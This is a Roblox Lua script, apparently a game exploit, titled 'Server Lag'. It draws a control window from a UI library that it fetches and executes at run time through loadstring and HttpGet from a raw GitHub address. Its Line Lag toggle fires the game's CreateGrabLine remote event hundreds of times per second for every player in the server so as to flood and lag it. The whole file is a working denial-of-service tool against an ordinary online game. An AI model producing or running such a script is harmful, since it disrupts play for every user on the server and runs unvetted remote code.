local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Server_Lag_Script"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/fleksmi-bot/Library2/refs/heads/main/Library1.lua"))()

local Window = Library:CreateWindow({
    Title = "Server Lag",
    Theme = "Night",
    ShowWatermark = { Enabled = true, Title = true, User = false, FPS = true, Duration = false, Ping = true, Time= false },
    ToggleKey = Enum.KeyCode.RightShift,
})

local ServerTab = Window:CreateTab("Server", true)
local ServerBlock = ServerTab:CreateBlock({Name = "Server Lag", Side = "Left"})

local RS = game:GetService("ReplicatedStorage")
local GrabEvents = RS:FindFirstChild("GrabEvents")
local CreateGrabLine = GrabEvents and GrabEvents:FindFirstChild("CreateGrabLine")

-- ============ LINE LAG (1-10) С ВИДИМЫМИ ЛИНИЯМИ ============
local lineLagActive = false
local lineLagTask = nil
local lineLagPower = 1

ServerBlock:CreateSlider({
    Name = "Line Lag Power (1-10)",
    Min = 1,
    Max = 10,
    Default = 1,
    Rounding = 0,
    Callback = function(Value)
        lineLagPower = Value
    end
})

ServerBlock:CreateToggle({
    Name = "Line Lag",
    Default = false,
    Callback = function(Value)
        lineLagActive = Value
        
        if Value then
            local power = lineLagPower
            local intensity = power * 50
            
            Library:Notify({ 
                Title = "Line Lag", 
                Content = "Enabled (Power: " .. power .. " | " .. intensity .. " lines/sec)", 
                Duration = 3 
            })
            
            lineLagTask = task.spawn(function()
                while lineLagActive do
                    for _, player in pairs(Players:GetPlayers()) do
                        if player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or player.Character:FindFirstChild("UpperTorso") or player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _ = 1, intensity do
                                    pcall(function()
                                        CreateGrabLine:FireServer(torso, Vector3.zero, torso.Position, false)
                                    end)
                                end
                            end
                        end
                    end
                    task.wait(0.5)
                end
            end)
        else
            if lineLagTask then
                task.cancel(lineLagTask)
                lineLagTask = nil
            end
            Library:Notify({ Title = "Line Lag", Content = "Disabled", Duration = 2 })
        end
    end
})

Library:Notify({ Title = "Server Lag", Content = "Loaded!", Duration = 3 })
